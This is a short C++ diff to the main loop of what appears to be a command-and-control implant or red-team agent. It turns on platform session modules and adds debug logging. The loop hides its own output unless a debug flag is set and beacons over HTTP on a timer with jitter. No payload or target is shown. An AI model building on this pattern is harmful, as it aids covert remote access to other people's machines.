@@ -11,19 +11,22 @@
 
 #ifdef __unix__
 #include "Linux/generic.hpp"
-// #include "Linux/Session/session.hpp"
+#include "Linux/Session/session.hpp"
 #endif
 #ifdef _WIN32
 #include "Windows/generic.hpp"
+#include "Windows/Session/session.hpp"
 #endif
 
 int main() {
     // Suppress stdout and stderr when DEBUG is not set
     #ifndef DEBUG
     surpressOutput();
+    #else
+    logger.warn("Debug mode enabled");
     #endif
-
     logger.warn("Program Starting");
+
     while (true) {
         try {
             if (ID != "" && JITTER != -1 && TIMER != -1) {
@@ -57,6 +60,7 @@ int main() {
             logger.error(std::string("Failed to establish HTTP connection: ") + e.what());
             return 1;
         }
+
     }
     return 0;
 }
